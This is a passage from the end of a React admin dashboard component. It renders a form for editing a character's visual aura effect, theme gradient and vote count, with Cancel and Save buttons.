                                                                className={`w-8 h-8 rounded flex items-center justify-center transition-all ${isSelected ? 'bg-indigo-600 text-white shadow-lg scale-110' : 'bg-slate-900 text-slate-500 hover:text-white'}`}
                                                                title={opt.label}
                                                             >
                                                                 <Icon size={14} />
                                                             </button>
                                                         )
                                                     })}
                                                 </div>
                                            </div>
                                         </div>
                                     </div>

                                     {/* Technical Data & VISUAL EFFECTS */}
                                     <div className="grid grid-cols-2 gap-6 mb-6">
                                         <div>
                                             <label className="text-xs text-slate-400 font-bold uppercase tracking-wider mb-2 block">Active Effect (Aura)</label>
                                             <select 
                                                value={editingChar.activeEffect || 'none'} 
                                                onChange={(e) => setEditingChar({...editingChar, activeEffect: e.target.value as any})}
                                                className="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-white focus:border-indigo-500 outline-none cursor-pointer"
                                             >
                                                <option value="none">None (Default)</option>
                                                <option value="fire">🔥 Burning Rage</option>
                                                <option value="lightning">⚡ Electric Surge</option>
                                                <option value="shadow">👻 Dark Aura</option>
                                             </select>
                                         </div>
                                         <div>
                                             <label className="text-xs text-slate-400 font-bold uppercase tracking-wider mb-2 block">Theme Gradient (Tailwind)</label>
                                             <input type="text" value={editingChar.themeColor || ''} onChange={(e) => setEditingChar({...editingChar, themeColor: e.target.value})} className="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-xs text-slate-300 focus:border-indigo-500 outline-none font-mono" placeholder="from-color-500 to-color-900"/>
                                         </div>
                                         <div className="col-span-2">
                                            <label className="text-xs text-slate-400 font-bold uppercase tracking-wider mb-2 block">Current Votes</label>
                                            <input type="number" value={editingChar.votes || 0} onChange={(e) => setEditingChar({...editingChar, votes: parseInt(e.target.value)})} className="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-white focus:border-indigo-500 outline-none font-mono"/>
                                         </div>
                                     </div>

                                     {/* Actions */}
                                     <div className="flex justify-end gap-4 pt-4 border-t border-slate-800">
                                         <button onClick={() => setIsEditing(false)} className="px-6 py-3 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition-colors">Cancel</button>
                                         <button onClick={handleSaveCharacter} className="px-8 py-3 bg-indigo-600 text-white font-bold rounded-lg hover:bg-indigo-500 shadow-lg shadow-indigo-900/30 flex items-center gap-2">
                                             <Save size={18}/> Save Changes
                                         </button>
                                     </div>

                                 </div>
                             </motion.div>
                         </div>
                     )}
                 </AnimatePresence>
             </motion.div>
         )}
      </main>
    </div>
  );
};

export default AdminDashboard;